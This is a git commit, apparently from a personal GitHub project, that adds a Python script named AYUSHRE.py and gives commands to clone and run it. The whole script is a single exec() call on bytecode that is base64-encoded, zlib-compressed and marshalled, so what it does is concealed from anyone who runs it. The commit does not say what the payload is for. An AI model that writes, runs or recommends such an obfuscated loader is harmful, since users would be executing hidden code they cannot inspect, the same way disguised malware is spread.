23e8cbaafec55d252c25524fc2b04b69ccebace2
Xmãrty Ãyûsh Kîñg <138370370+ayushking420@users.noreply.github.com>
2023-11-17 19:24:29 +0530

    Create AYUSHRE.py
    git clone https://github.com/ayushking420/AYUSHRE.git
    cd AYUSHRE
    python AYUSHRE.py

---
+++ AYUSHRE.py
@@ -0,0 +1,5 @@
+# Compiled AYUSH KING
+# Github : 
+
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b64decode("eJyFjr9KxEAQh3+beH9ipbGTS0xlTEDiA4iPYGNnF25XQRIXdnOIqSwUfAPfQBDfRXYhxZHWyk64zsrkuCwSkOwuszPfNwPziT/H3vyrjya8gIKSDJewwHBDuiZqvTb5u6lJ39sDfmvAjwb8eMBP+p6SC0TTr7Y4r0fzjKWi3BF5cCyugkTSeSpoEpd7HaH87jbjKZUNnJm2gov0miUsX2RpwWhy0tjdvo3L/X8H4siqLS7rsbyXBcvfsGoXqu1U8p/pac7pImNnwllvDMinJnzbhJAlnIf1bRPr0XkONdwKroK7IWp7puFV8BQ8gw40ggqBQmDQkUZUIVKIDPI0/Aq+gm/QoUZYIVTdE5Nmk18CbHZy"))))
